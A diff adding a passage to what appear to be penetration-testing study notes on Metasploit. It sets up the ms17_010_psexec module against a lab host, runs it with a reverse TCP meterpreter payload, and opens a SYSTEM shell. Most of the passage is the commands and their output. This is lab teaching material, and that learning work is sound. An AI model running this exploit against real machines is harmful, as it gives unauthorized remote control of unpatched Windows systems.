@@ -99,3 +99,67 @@ Next, we want to select the appropriate module for this scenario. From the Nmap 
 Within the interactive modules, there are several options that we can specify. These are used to adapt the Metasploit module to the given environment. Because in most cases, we always need to scan or attack different IP addresses. Therefore, we require this kind of functionality to allow us to set our targets and fine-tune them. To check which options are needed to be set before the exploit can be sent to the target host, we can use the show options command. Everything required to be set before the exploitation can occur will have a Yes under the Required column.
 
 <h3>MSF - Select Module</h3>
+
+<img width="1037" height="872" alt="image" src="https://github.com/user-attachments/assets/92ed0a1b-0297-4f76-9157-e2cdc58fbb77" />
+
+Here we see how helpful the No. tags can be. Because now, we do not have to type the whole path but only the number assigned to the Metasploit module in our search. We can use the command info after selecting the module if we want to know something more about the module. This will give us a series of information that can be important for us.
+
+<h3>MSF - Module Information</h3>
+
+msf6 exploit(windows/smb/ms17_010_psexec) > info
+
+After we are satisfied that the selected module is the right one for our purpose, we need to set some specifications to customize the module to use it successfully against our target host, such as setting the target (RHOST or RHOSTS).
+
+<h3>MSF - Target Specification</h3>
+
+  Modules
+  
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
+
+RHOSTS => 10.10.10.40
+
+msf6 exploit(windows/smb/ms17_010_psexec) > options
+
+In addition, there is the option setg, which specifies options selected by us as permanent until the program is restarted. Therefore, if we are working on a particular target host, we can use this command to set the IP address once and not change it again until we change our focus to a different IP address.
+
+<h3>MSF - Permanent Target Specification</h3>
+
+msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
+
+RHOSTS => 10.10.10.40
+
+Finally, since we are about to use a TCP-based reverse shell (/windows/meterpreter/reverse_tcp) we need to specify to which IP address it needs to connect to in order to establish a connection. Therefore, we need to set LHOST to our own IP address like following:
+
+<h3>MSF - LHOST Specification</h3>
+
+msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
+
+LHOSTS => 10.10.14.15
+
+Once everything is set and ready to go, we can proceed to launch the attack. Note that the payload was not set here, as the default one is sufficient for this demonstration.
+
+<h3>MSF - Exploit Execution</h3>
+
+msf6 exploit(windows/smb/ms17_010_psexec) > run
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+
+
+meterpreter> shell
+
+C:\Windows\system32>
+
+We now have a shell on the target machine, and we can interact with it.
+
+<h3>MSF - Target Interaction</h3>
+
+C:\Windows\system32> whoami
+
+whoami
+
+nt authority\system
+
+This has been a quick and dirty example of how msfconsole can help out quickly but serves as an excellent example of how the framework works. Only one module was needed without any payload selection, encoding or pivoting between sessions or jobs.
+
